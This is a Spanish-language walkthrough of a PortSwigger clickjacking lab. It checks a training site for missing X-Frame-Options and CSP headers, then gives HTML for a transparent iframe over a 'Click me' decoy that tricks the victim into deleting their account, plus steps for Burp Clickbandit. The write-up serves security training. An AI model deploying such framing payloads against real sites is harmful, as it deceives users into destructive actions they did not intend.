---
title: Basic clickjacking with CSRF token protection
description: Laboratorio de Portswigger sobre Clickjacking
date: 2025-03-26 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - Clickjacking
tags:
  - Portswigger Labs
  - Clickjacking
  - Basic clickjacking with CSRF token protection
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` contiene funcionalidad de `inicio de sesión` y un botón de `eliminar cuenta` que está protegido por un `token CSRF`. El `usuario víctima` hará `click` en elementos que muestran la palabra `"click"`

Para `resolver` el `laboratorio`, debemos crear un `HTML` que enmarque la página de la cuenta y `engañe` al `usuario` para que `elimine` su `cuenta`. El `laboratorio` se resuelve cuando la `cuenta` es eliminada. Podemos `iniciar sesión` en nuestra propia cuenta utilizando las credenciales `wiener:peter`

---

## Guía de clickjacking

`Antes` de `completar` este `laboratorio` es recomendable `leerse` esta `guía de clickjacking` [https://justice-reaper.github.io/posts/Clickjacking-Guide/](https://justice-reaper.github.io/posts/Clickjacking-Guide/)

## Resolución

Al `acceder` a la `web` vemos esto

![](/assets/img/Clickjacking-Lab-1/image_1.png)

Si hacemos click sobre `My account` nos podemos `loguear` con las credenciales `wiener:peter`

![](/assets/img/Clickjacking-Lab-1/image_2.png)

Después de `iniciar sesión` vemos que podemos `cambiarnos` el `correo electrónico` y `eliminar` la `cuenta`

![](/assets/img/Clickjacking-Lab-1/image_3.png)

Si pulsamos sobre `View post` vemos que hay una sección de comentarios

![](/assets/img/Clickjacking-Lab-1/image_4.png)

Para ver si una `web` es `vulnerable` a `Clickjacking` podemos usar la herramienta `shcheck` [https://github.com/santoru/shcheck.git](https://github.com/santoru/shcheck.git()) para `identificar` las `cabeceras de seguridad`

```
# shcheck.py -i -x -k https://0a160029048081a6869fe54a003f00c3.web-security-academy.net/

======================================================
 > shcheck.py - santoru ..............................
------------------------------------------------------
 Simple tool to check security headers on a webserver 
======================================================

[*] Analyzing headers of https://0a160029048081a6869fe54a003f00c3.web-security-academy.net/
[!] URL Returned an HTTP error: 404
[*] Effective URL: https://0a160029048081a6869fe54a003f00c3.web-security-academy.net/
[!] Missing security header: X-XSS-Protection
[!] Missing security header: X-Frame-Options
[!] Missing security header: X-Content-Type-Options
[!] Missing security header: Strict-Transport-Security
[!] Missing security header: Content-Security-Policy
[!] Missing security header: X-Permitted-Cross-Domain-Policies
[!] Missing security header: Referrer-Policy
[!] Missing security header: Expect-CT
[!] Missing security header: Permissions-Policy
[!] Missing security header: Cross-Origin-Embedder-Policy
[!] Missing security header: Cross-Origin-Resource-Policy
[!] Missing security header: Cross-Origin-Opener-Policy

[*] No information disclosure headers detected

[*] No caching headers detected
-------------------------------------------------------
[!] Headers analyzed for https://0a160029048081a6869fe54a003f00c3.web-security-academy.net/
[+] There are 0 security headers
[-] There are not 12 security headers
```

Si preferimos usar una herramienta `web` podemos usar `securityheaders` [https://securityheaders.com/](https://securityheaders.com/) 

![](/assets/img/Clickjacking-Lab-1/image_5.png)

En este caso, vemos que la `web` no tiene ni `Content-Security-Policy (CSP)` ni `X-Frame-Options`, lo cual la hace vulnerable a `Clickjacking`. Nos dirigimos al `Exploit Server` y pegamos este `payload`

```
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.3;
       z-index: 2;
   }
   div {
       position:absolute;
       top:495px;
       left:70px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://0a4a00f50345e77a8330fffc00bc001c.web-security-academy.net/my-account"></iframe>
```

![](/assets/img/Clickjacking-Lab-1/image_6.png)

Pinchamos sobre `View exploit` para `comprobar` que está `bien centrado` el `div` que contiene el texto `Click me`

![](/assets/img/Clickjacking-Lab-1/image_7.png)

Una vez comprobado `modificamos` la `opacidad` a `0`

```
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0;
       z-index: 2;
   }
   div {
       position:absolute;
       top:495px;
       left:70px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://0a4a00f50345e77a8330fffc00bc001c.web-security-academy.net/my-account"></iframe>
```

![](/assets/img/Clickjacking-Lab-1/image_8.png)

Otra forma alternativa sería usando la herramienta `Clickbandit` de `Burpsuite`, para usarla nos dirigimos a `Burpsuite` y pulsamos `Burp > Burp Clickbandit`

![](/assets/img/Clickjacking-Lab-1/image_9.png)

Pulsamos sobre `Copy Clickbandit to clipboard`

![](/assets/img/Clickjacking-Lab-1/image_10.png)

Nos dirigimos a `Chrome`, nos abrimos la `consola de desarrollador` y `pegamos` ahí todo el `código`

![](/assets/img/Clickjacking-Lab-1/image_11.png)

Una vez hecho esto nos saldrá este menú

![](/assets/img/Clickjacking-Lab-1/image_12.png)

Pulsamos en `Start` y `marcamos` la casilla `Disable click actions` para `desactivar` los `clicks`

![](/assets/img/Clickjacking-Lab-1/image_13.png)

Lo siguiente sería `pulsar sobre el botón que queremos`, en este caso sobre `Delete account` que es el que queremos usar para el `ataque de Clickjacking`

![](/assets/img/Clickjacking-Lab-1/image_14.png)

Una vez hecho esto, `pulsamos` sobre `Finish` y se nos `mostrará` como es nuestro `payload` actualmente

![](/assets/img/Clickjacking-Lab-1/image_15.png)

Usando los símbolos `-` y `+`, podemos `subir` o `bajar` el `aumento`, y con `Toogle transparency` podemos `activar` o `desactivar` la `transparencia`. En mi caso, lo voy a dejar de esta forma. Cuando ya lo tengamos como queremos, pulsamos en `Save` y se nos `descargará` un `documento HTML`

![](/assets/img/Clickjacking-Lab-1/image_16.png)

`Pegamos` el `código` en el `Exploit server`

![](/assets/img/Clickjacking-Lab-1/image_17.png)

Pulsamos sobre `View exploit` para ver si se ve correctamente. Una vez comprobado que se `ve` y `funciona` correctamente, pulsamos sobre `Deliver exploit to victim` y completamos el `laboratorio`

![](/assets/img/Clickjacking-Lab-1/image_18.png)
